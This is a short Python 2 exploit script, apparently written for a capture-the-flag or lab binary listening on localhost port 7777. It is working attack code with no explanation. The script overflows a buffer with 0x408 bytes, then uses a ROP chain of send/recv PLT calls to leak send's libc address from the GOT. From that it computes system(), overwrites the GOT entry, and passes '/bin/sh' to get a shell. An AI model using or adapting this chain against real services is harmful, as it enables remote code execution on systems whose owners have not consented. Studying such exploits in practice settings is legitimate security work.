from struct import *
from time import *
from socket import *

p = lambda x: pack("<L", x)
up = lambda x: unpack("<L", x)
puts_got = 0x8048550
puts_plt = 0x8048550
send_plt = 0x8048610
send_got  = 0x804a048
recv_plt = 0x80485f0  
ppppr = 0x80489cc
bss = 0x0804a054
offset = 0xabc20

s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 7777))

print s.recv(1024)		
payload = ""
payload += "a"*0x408
payload += "bbbb"
payload += p(send_plt)
payload += p(ppppr)
payload += p(4)
payload += p(send_got)
payload += p(4)
payload += p(0)

payload += p(recv_plt)
payload += p(ppppr)
payload += p(4)
payload += p(send_got)
payload += p(4)
payload += p(0)

payload += p(recv_plt)
payload += p(ppppr)
payload += p(4)
payload += p(bss)
payload += p(8)
payload += p(0)

payload += p(send_plt)
payload += "aaaa"
payload += p(bss)

s.send(payload)
sleep(1)
send_libc = up(s.recv(4))[0]
system_libc = send_libc - offset

print "[*] system_libc : %s" %hex(system_libc)
sleep(1)
s.send(p(system_libc))
sleep(1)

s.send("/bin/sh")
